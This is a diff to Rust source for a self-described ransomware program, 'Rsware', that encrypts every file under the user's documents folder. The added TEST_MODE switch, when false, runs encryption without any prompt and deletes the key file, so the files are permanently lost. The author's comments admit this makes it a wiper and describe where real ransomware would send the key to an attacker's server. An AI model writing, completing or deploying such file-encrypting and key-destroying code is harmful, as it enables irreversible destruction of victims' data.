@@ -5,20 +5,27 @@ use dirs::document_dir;
 use walkdir::WalkDir;
 use text_io::read;
 
+const TEST_MODE:			bool	= true;
 const ENCRYPTED_EXTENSION:	&str	= ".🔒";
 const KEY_FILE_NAME:		&str	= "key.txt";
 
 type IDFC<T>		= Result<T, Box<dyn std::error::Error>>;
 
 fn main() -> IDFC<()> {
-	// Ask which mode to run in
-	println!("E___ = encrypt, D___ = decrypt, any else = quit");
-	let mode_choice: String = read!();
-	let mode_choice_firstchar = mode_choice.chars().nth(0).unwrap().to_lowercase().to_string();
-	let mode = match mode_choice_firstchar.as_str() {
-		"e"	=> RswareMode::Encrypt,
-		"d"	=> RswareMode::Decrypt,
-		_	=> RswareMode::Quit,
+	let mode = if TEST_MODE {
+		// Ask which mode to run in
+		println!("E___ = encrypt, D___ = decrypt, any else = quit");
+		let mode_choice: String = read!();
+		let mode_choice_firstchar = mode_choice.chars().nth(0).unwrap().to_lowercase().to_string();
+		let mode = match mode_choice_firstchar.as_str() {
+			"e"	=> RswareMode::Encrypt,
+			"d"	=> RswareMode::Decrypt,
+			_	=> RswareMode::Quit,
+		};
+
+		mode
+	} else {
+		RswareMode::Encrypt
 	};
 
 	if matches!(mode, RswareMode::Quit) {
@@ -49,7 +56,7 @@ fn main() -> IDFC<()> {
 	match mode {
 		RswareMode::Encrypt	=> {
 			let key = SecretKey::default();
-			fs::write(keyfile_loc, key.unprotected_as_bytes())?;
+			fs::write(&keyfile_loc, key.unprotected_as_bytes())?;
 
 			// encrypt shit :P
 			for entry in entries {
@@ -61,6 +68,37 @@ fn main() -> IDFC<()> {
 						
 					encrypt_file(path, &key)?;
 				}
+			}
+
+			// rm keys file, unless testing
+			if !TEST_MODE {
+				/*
+
+				if this were real ransomware, then this is where
+				you'd write the code to send off the keys.txt to
+				your own server before deleting it.
+
+				In our case, we're not actually extorting people,
+				because that's a piece o shit thing to do.
+
+				Because of that, there's really no way to recover
+				the files unless you're in test mode. I guess this
+				would technically be considered a wiper, rather than
+				ransomware.
+
+				Anyway, if you want to compile this and test it against
+				antiviruses, it would be pretty dishonest to compile
+				it with TEST_MODE set to true. Go set that to false,
+				so the "less-than-smart" AVs can detect that it actually
+				deletes shit and doesn't get stuck waiting for user input.
+
+				Again, remember, setting it to false = no keys.txt! Your
+				test files will be permanently encrypted, with no decryption
+				key left for you to use! BE CAREFUL!
+
+				*/
+
+				fs::remove_file(&keyfile_loc)?
 			}
 		},
 		
